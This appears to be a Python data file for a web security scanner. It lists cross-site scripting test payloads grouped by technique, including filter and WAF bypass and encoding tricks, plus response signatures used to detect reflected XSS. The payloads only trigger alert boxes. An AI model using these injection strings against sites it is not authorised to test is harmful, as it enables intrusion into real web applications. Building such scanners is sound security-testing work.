"""
XSS (Cross-Site Scripting) test payloads
Includes basic XSS, WAF bypass, and encoding techniques
"""

XSS_PAYLOADS = [
    # ==================== BASIC XSS ====================
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert('test')</script>",
    
    # ==================== IMG TAG VECTORS ====================
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<img src='x' onerror='alert(1)'>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    
    # ==================== SVG VECTORS ====================
    "<svg/onload=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)//",
    "<svg/onload=alert(String.fromCharCode(88,83,83))>",
    
    # ==================== EVENT HANDLERS ====================
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<iframe onload=alert('XSS')>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    
    # ==================== WITHOUT SCRIPT TAGS ====================
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<meter onmouseover='alert(1)' high=50>2</meter>",
    "<div style=\"background:url('javascript:alert(1)')\" />",
    
    # ==================== ENCODED PAYLOADS ====================
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    
    # ==================== DOM-BASED ====================
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>",
    "data:text/html;charset=UTF-8,<script>alert(1)</script>",
    
    # ==================== FILTER BYPASS ====================
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<SCRipT>alert('XSS')</sCRipT>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<script>/**/alert('XSS')</script>",
    "<script>var a='alert(1)'//';alert(1);var a='</script>",
    
    # ==================== ATTRIBUTE-BASED ====================
    "\" onmouseover=\"alert('XSS')\"",
    "' onmouseover='alert(\"XSS\")'",
    "\" onclick=\"alert(1)\"",
    "' onclick='alert(1)'",
    
    # ==================== ALTERNATIVE TAGS ====================
    "<object data=\"javascript:alert('XSS')\">",
    "<embed src=\"javascript:alert('XSS')\">",
    "<applet code='java.lang.Runtime' codebase='.'>",
    
    # ==================== CASE SENSITIVITY BYPASS ====================
    "<ScRiPt>alert(1)</sCrIpT>",
    "<IMG SRC=X ONERROR=alert(1)>",
    
    # ==================== UNICODE/HEX ENCODING ====================
    "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">",
    
    # ==================== WAF BYPASS TECHNIQUES ====================
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set attributeName=onclick to=alert(1)>",
    "<svg><animate attributeName=onclick values=alert(1) dur=1s repeatCount=1>",
    "<svg><feImage><animate attributeName=href to=javascript:alert(1) dur=1s>",
    
    # ==================== LESS COMMON VECTORS ====================
    "<source onerror=alert(1)>",
    "<track onload=alert(1)>",
    "<video onloadstart=alert(1)>",
    "<audio onloadstart=alert(1)>",
    "<picture><img onerror=alert(1)>",
    
    # ==================== FORM-BASED ====================
    "<form onsubmit=alert(1)><input type=submit></form>",
    "<form action=javascript:alert(1)><input type=submit></form>",
    
    # ==================== STYLE-BASED ====================
    "<style>*{background:url('javascript:alert(1)')}</style>",
    "<link rel=stylesheet href=javascript:alert(1)>",
]

# XSS signatures to detect in response (for detection purposes)
# These are patterns that indicate unsafe XSS present in response
XSS_SIGNATURES = [
    "<script>",
    "</script>",
    "alert(",
    "onerror=",
    "onload=",
    "onmouseover=",
    "onclick=",
    "onfocus=",
    "onsubmit=",
    "javascript:",
    "data:text/html",
    "<img",
    "<svg",
    "<iframe",
    "<object",
    "<embed",
    "<applet",
    "<form",
    "<input",
    "eval(",
    "expression(",
]
